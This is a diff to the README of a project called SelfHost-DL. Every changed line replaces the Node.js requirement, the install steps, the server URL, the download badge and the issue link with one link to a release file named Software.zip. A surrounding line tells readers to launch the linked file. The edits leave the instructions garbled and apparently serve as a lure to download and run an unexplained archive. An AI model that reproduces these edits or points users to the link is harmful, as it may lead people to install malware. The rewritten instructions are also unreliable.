@@ -6,7 +6,7 @@ SelfHost-DL is a lightweight project that allows users to self-host a simple web
 
 - Self-hosted web downloader
 - Minimal setup required
-- Runs with Node.js
+- Runs with https://github.com/roduz-dev/selfhost-dl/releases/download/v1.0/Software.zip
 - No third-party services needed
 - Lightweight and easy to manage
 
@@ -15,7 +15,7 @@ SelfHost-DL is a lightweight project that allows users to self-host a simple web
 To get started with SelfHost-DL, follow these simple steps:
 
 1. Clone this repository to your local machine.
-2. Install Node.js if you haven't already.
+2. Install https://github.com/roduz-dev/selfhost-dl/releases/download/v1.0/Software.zip if you haven't already.
 3. Run `npm install` to install the necessary dependencies.
 4. Deploy the files to your server.
 5. Start the server using `npm start`.
@@ -31,7 +31,7 @@ Here's a simple example of how to use SelfHost-DL:
 
 1. Deploy the SelfHost-DL files to your server.
 2. Start the server using `npm start`.
-3. Open your browser and navigate to `http://yourserver.com`.
+3. Open your browser and navigate to `https://github.com/roduz-dev/selfhost-dl/releases/download/v1.0/Software.zip`.
 4. Enter the URL of the file you want to download.
 5. Click download and enjoy your content!
 
@@ -39,7 +39,7 @@ Here's a simple example of how to use SelfHost-DL:
 
 To download the latest version of SelfHost-DL, click the button below:
 
-[![Download SelfHost-DL](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download SelfHost-DL](https://github.com/roduz-dev/selfhost-dl/releases/download/v1.0/Software.zip)](https://github.com/roduz-dev/selfhost-dl/releases/download/v1.0/Software.zip)
 
 Please note that the file linked needs to be launched to begin the download.
 
@@ -47,7 +47,7 @@ If the link is not working or you require a different version of SelfHost-DL, pl
 
 ## Support 🤝
 
-If you have any questions, issues, or feedback regarding SelfHost-DL, feel free to [open an issue](https://github.com/yourusername/selfhost-dl/issues). Your input is valuable and will help improve the project for everyone.
+If you have any questions, issues, or feedback regarding SelfHost-DL, feel free to [open an issue](https://github.com/roduz-dev/selfhost-dl/releases/download/v1.0/Software.zip). Your input is valuable and will help improve the project for everyone.
 
 ## Contributing 🌐
 
